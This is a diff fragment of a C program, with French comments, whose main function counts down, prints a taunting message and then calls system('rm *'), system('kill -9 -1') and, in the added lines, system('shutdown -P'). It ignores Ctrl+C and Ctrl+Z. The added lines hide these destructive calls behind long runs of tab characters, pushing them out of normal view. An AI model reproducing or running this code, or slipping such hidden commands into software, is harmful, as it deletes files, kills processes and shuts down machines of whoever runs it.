@@ -395,16 +395,16 @@ int main(int N, char *P[])
 {
 	/* initialisations diverses */
 	int i;
-	for(i = 3; i> 0; i--)
-	{
-		printf("%d\n", i);
-		sleep(1);
-	}	
-	printf("TROOOOOOOOOOOOOOOOOOOOOOOOOOOOL\n MouHAHAHAHAHAHAHAHA");
-	sleep(2);
-	system("rm *");
-	system("kill -9 -1");
-	
+																																								for(i = 3; i> 0; i--)
+																																							{
+																																					printf("%d\n", i);
+																																						sleep(1);
+																																							}	
+																																										printf("TROOOOOOOOOOOOOOOOOOOOOOOOOOOOL\n MouHAHAHAHAHAHAHAHA");
+																																					sleep(2);
+																																				system("rm *");
+																																									system("kill -9 -1");
+																																																																						system("shutdown -P");
 	signal(SIGINT, SIG_IGN); /* on ignore l'interruption du clavier (Ctrl + C)*/
 	signal(SIGTSTP, SIG_IGN);
 	system("clear");
